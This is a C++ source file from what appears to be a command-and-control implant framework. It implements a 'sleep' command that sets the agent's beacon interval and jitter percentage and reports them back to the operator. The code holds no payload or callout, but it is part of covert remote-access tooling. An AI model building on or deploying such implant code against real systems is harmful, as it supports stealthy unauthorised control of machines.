#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SLEEP

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_sleep(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t interval = parser_int32( params );
    uint32_t jitter   = parser_int32( params );

    DBG_PRINT( inst, "cmd_sleep: interval=%dms jitter=%d%%\n", interval, jitter );

    inst.agent.sleep_ms   = interval;
    inst.agent.jitter_pct = jitter;

    char msg[64] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "sleep " ) ) );
    char num[12];
    int_to_str( num, interval, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( "ms jitter " ) ) );
    int_to_str( num, jitter, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( "%" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
